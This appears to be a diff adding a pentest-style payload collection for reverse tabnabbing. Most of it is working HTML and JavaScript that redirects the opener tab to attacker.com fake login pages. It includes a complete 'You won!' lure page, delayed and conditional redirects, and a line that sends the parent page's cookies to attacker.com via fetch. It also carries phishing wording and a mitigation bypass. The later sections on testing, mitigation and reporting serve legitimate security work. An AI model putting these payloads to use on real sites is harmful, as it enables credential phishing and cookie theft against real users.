@@ -1,0 +1,343 @@
+# Tabnabbing (Reverse Tabnabbing) Payloads
+
+## ========================================
+## BASIC TABNABBING
+## ========================================
+
+# Malicious link with target="_blank"
+<a href="http://attacker.com" target="_blank">Click here</a>
+
+# JavaScript in attacker's page
+if (window.opener) {
+  window.opener.location = "http://attacker.com/phishing.html";
+}
+
+## ========================================
+## WINDOW.OPENER EXPLOITATION
+## ========================================
+
+# Redirect parent window
+<script>
+  window.opener.location = "http://attacker.com/fake-login.html";
+</script>
+
+# Replace parent page
+<script>
+  if (window.opener) {
+    window.opener.location.replace("http://attacker.com/phishing");
+  }
+</script>
+
+## ========================================
+## PHISHING ATTACK
+## ========================================
+
+# Attacker's page (opened in new tab)
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Legitimate Site</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    if (window.opener) {
+      // Redirect original tab to phishing page
+      window.opener.location = "http://attacker.com/phishing-login.html";
+    }
+  </script>
+</body>
+</html>
+
+## ========================================
+## PARENT WINDOW MANIPULATION
+## ========================================
+
+# Access parent DOM
+<script>
+  if (window.opener) {
+    window.opener.document.body.innerHTML = "<h1>Hacked</h1>";
+  }
+</script>
+
+# Steal data from parent
+<script>
+  if (window.opener) {
+    var data = window.opener.document.cookie;
+    fetch("http://attacker.com/steal?data=" + data);
+  }
+</script>
+
+## ========================================
+## DETECTION PAYLOAD
+## ========================================
+
+# Test if vulnerable
+<a href="http://test.com" target="_blank">Test Link</a>
+
+# On test.com
+<script>
+  if (window.opener) {
+    alert("Vulnerable to tabnabbing!");
+  }
+</script>
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Social media attack
+User clicks external link in social media post
+→ Opens in new tab
+→ Original tab redirected to fake login page
+→ User doesn't notice, re-enters credentials
+
+# Example 2: Forum/Comments
+Post malicious link in forum
+→ Users click, opens new tab
+→ Original forum tab becomes phishing page
+
+## ========================================
+## VULNERABLE PATTERNS
+## ========================================
+
+# Pattern 1: target="_blank" without rel
+<a href="http://untrusted.com" target="_blank">Link</a>
+
+# Pattern 2: window.open() without noopener
+<script>
+  window.open("http://untrusted.com");
+</script>
+
+## ========================================
+## MITIGATION BYPASS
+## ========================================
+
+# If rel="noopener" is partially implemented
+<a href="http://attacker.com" target="_blank" rel="">Link</a>
+
+# If checking is client-side
+Modify JavaScript to remove protection
+
+## ========================================
+## ADVANCED TECHNIQUES
+## ========================================
+
+# Delayed redirect
+<script>
+  setTimeout(function() {
+    if (window.opener) {
+      window.opener.location = "http://attacker.com/phishing";
+    }
+  }, 5000); // Wait 5 seconds
+</script>
+
+# Conditional redirect
+<script>
+  if (window.opener && document.referrer.includes("target-site.com")) {
+    window.opener.location = "http://attacker.com/fake-target-site-login";
+  }
+</script>
+
+## ========================================
+## PAYLOAD VARIATIONS
+## ========================================
+
+# Variation 1: Simple redirect
+window.opener.location = "http://attacker.com";
+
+# Variation 2: href manipulation
+window.opener.location.href = "http://attacker.com";
+
+# Variation 3: Replace
+window.opener.location.replace("http://attacker.com");
+
+# Variation 4: Assign
+window.opener.location.assign("http://attacker.com");
+
+## ========================================
+## REAL-WORLD ATTACK FLOW
+## ========================================
+
+# Step 1: Attacker posts link
+<a href="http://malicious.com/interesting-article" target="_blank">
+  Check out this article!
+</a>
+
+# Step 2: User clicks link
+Opens in new tab, reads article
+
+# Step 3: malicious.com executes
+<script>
+  window.opener.location = "http://fake-original-site.com/login";
+</script>
+
+# Step 4: User switches back
+Sees "Session expired, please login again"
+
+# Step 5: User enters credentials
+Credentials sent to attacker
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Find external links with target="_blank"
+grep -r 'target="_blank"' .
+
+# 2. Check for rel="noopener"
+Look for missing rel attribute
+
+# 3. Test with PoC
+Create test page with window.opener code
+
+# 4. Verify
+Confirm parent window can be manipulated
+
+## ========================================
+## PREVENTION TESTING
+## ========================================
+
+# Check for proper mitigation
+<a href="http://external.com" target="_blank" rel="noopener noreferrer">
+
+# Test if effective
+window.opener should be null
+
+## ========================================
+## BROWSER-SPECIFIC
+## ========================================
+
+# Modern browsers (partial mitigation)
+Some browsers automatically add noopener
+for cross-origin targets
+
+# Legacy browsers
+More vulnerable, no automatic protection
+
+## ========================================
+## PROOF OF CONCEPT
+## ========================================
+
+# PoC Link (victim site)
+<a href="http://attacker.com/poc.html" target="_blank">
+  Win a prize!
+</a>
+
+# PoC Page (attacker site)
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Congratulations!</title>
+</head>
+<body>
+  <h1>You won!</h1>
+  <p>Processing your prize...</p>
+  <script>
+    if (window.opener) {
+      // Redirect original tab to phishing
+      window.opener.location = "http://attacker.com/fake-victim-login.html";
+      
+      // Close this tab after redirect
+      setTimeout(function() {
+        window.close();
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
+
+## ========================================
+## SOCIAL ENGINEERING
+## ========================================
+
+# Make phishing page look identical
+Copy CSS, HTML, branding from real site
+
+# Fake error message
+"Your session has expired"
+"Please login again"
+"Verification required"
+
+## ========================================
+## COMBINATION ATTACKS
+## ========================================
+
+# Tabnabbing + Clickjacking
+Layer phishing page with clickjacking
+
+# Tabnabbing + XSS
+Use XSS to inject malicious links
+
+## ========================================
+## DETECTION TOOLS
+## ========================================
+
+# Manual testing
+Browser developer tools
+Check window.opener value
+
+# Automated scanning
+Link-rel-checker
+Custom scripts
+
+# Burp Suite
+Search for target="_blank"
+Check for rel attributes
+
+## ========================================
+## COMMON VULNERABLE SITES
+## ========================================
+
+# Forums
+External links in posts
+
+# Social media
+Shared links
+
+# Comment sections
+User-submitted links
+
+# Wikis
+External references
+
+# Email clients
+Links in emails
+
+## ========================================
+## MITIGATION CHECKLIST
+## ========================================
+
+- [ ] All target="_blank" links have rel="noopener"
+- [ ] External links have rel="noreferrer"
+- [ ] window.open() uses noopener
+- [ ] CSP restricts navigation
+- [ ] User education about phishing
+
+## ========================================
+## JAVASCRIPT WINDOW.OPEN
+## ========================================
+
+# Vulnerable
+window.open("http://untrusted.com");
+
+# Secure
+window.open("http://untrusted.com", "_blank", "noopener,noreferrer");
+
+## ========================================
+## REPORTING TEMPLATE
+## ========================================
+
+# Vulnerability Report
+Title: Reverse Tabnabbing Vulnerability
+Severity: Medium
+Impact: Phishing attack via parent window manipulation
+
+Steps to Reproduce:
+1. Navigate to http://target.com/page
+2. Click external link
+3. On opened page, window.opener is accessible
+4. Parent window can be redirected
+
+Recommendation:
+Add rel="noopener noreferrer" to all external links
